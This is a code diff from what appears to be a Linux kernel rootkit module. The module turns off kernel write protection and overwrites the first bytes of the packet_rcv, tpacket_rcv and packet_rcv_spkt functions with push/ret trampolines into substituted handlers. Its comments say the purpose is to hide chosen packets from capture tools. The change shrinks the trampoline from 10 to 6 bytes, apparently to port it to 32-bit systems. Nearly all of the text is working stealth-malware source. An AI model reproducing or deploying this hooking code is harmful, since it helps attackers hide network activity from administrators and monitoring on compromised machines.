@@ -32,13 +32,13 @@ unsigned long tpacket_rcv_flags;
 spinlock_t packet_rcv_spkt_lock;
 unsigned long packet_rcv_spkt_flags;
 
-char hook[10] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc3 };
-unsigned long *target = (unsigned long *) (hook + 1);
+char hook[6] = { 0x68, 0x00, 0x00, 0x00, 0x00, 0xc3 };
+unsigned int *target = (unsigned int *) (hook + 1);
 
 /* code of the original functions that has been overwritten by us */
-char original_packet_rcv[10];
-char original_tpacket_rcv[10];
-char original_packet_rcv_spkt[10];
+char original_packet_rcv[6];
+char original_tpacket_rcv[6];
+char original_packet_rcv_spkt[6];
 
 /* check if we need to hide this particular packet */
 int
@@ -62,11 +62,11 @@ hook_packet_rcv (void)
 	disable_page_protection();
 
 	/* set the correct jump target */
-	*target = (unsigned long) manipulated_packet_rcv;
+	*target = (unsigned int) manipulated_packet_rcv;
 
 	/* backup and overwrite the first part of the function */
-	memcpy(original_packet_rcv, packet_rcv, 10);
-	memcpy(packet_rcv, hook, 10);
+	memcpy(original_packet_rcv, packet_rcv, 6);
+	memcpy(packet_rcv, hook, 6);
 	
 	/* reenable write protection */
 	enable_page_protection();
@@ -80,11 +80,11 @@ hook_tpacket_rcv (void)
 	disable_page_protection();
 
 	/* set the correct jump target */
-	*target = (unsigned long) manipulated_tpacket_rcv;
+	*target = (unsigned int) manipulated_tpacket_rcv;
 
 	/* backup and overwrite the first part of the function */
-	memcpy(original_tpacket_rcv, tpacket_rcv, 10);
-	memcpy(tpacket_rcv, hook, 10);
+	memcpy(original_tpacket_rcv, tpacket_rcv, 6);
+	memcpy(tpacket_rcv, hook, 6);
 	
 	/* reenable write protection */
 	enable_page_protection();
@@ -98,11 +98,11 @@ hook_packet_rcv_spkt (void)
 	disable_page_protection();
 
 	/* set the correct jump target */
-	*target = (unsigned long) manipulated_packet_rcv_spkt;
+	*target = (unsigned int) manipulated_packet_rcv_spkt;
 
 	/* backup and overwrite the first part of the function */
-	memcpy(original_packet_rcv_spkt, packet_rcv_spkt, 10);
-	memcpy(packet_rcv_spkt, hook, 10);
+	memcpy(original_packet_rcv_spkt, packet_rcv_spkt, 6);
+	memcpy(packet_rcv_spkt, hook, 6);
 	
 	/* reenable write protection */
 	enable_page_protection();
@@ -116,7 +116,7 @@ unhook_packet_rcv (void)
 	disable_page_protection();
 
 	/* restore the first 10 bytes we changed */
-	memcpy(packet_rcv, original_packet_rcv, 10);
+	memcpy(packet_rcv, original_packet_rcv, 6);
 
 	/* reenable write protection */
 	enable_page_protection();
@@ -130,7 +130,7 @@ unhook_tpacket_rcv (void)
 	disable_page_protection();
 
 	/* restore the first 10 bytes we changed */
-	memcpy(tpacket_rcv, original_tpacket_rcv, 10);
+	memcpy(tpacket_rcv, original_tpacket_rcv, 6);
 
 	/* reenable write protection */
 	enable_page_protection();
@@ -144,7 +144,7 @@ unhook_packet_rcv_spkt (void)
 	disable_page_protection();
 
 	/* restore the first 10 bytes we changed */
-	memcpy(packet_rcv_spkt, original_packet_rcv_spkt, 10); 
+	memcpy(packet_rcv_spkt, original_packet_rcv_spkt, 6); 
 
 	/* reenable write protection */
 	enable_page_protection();
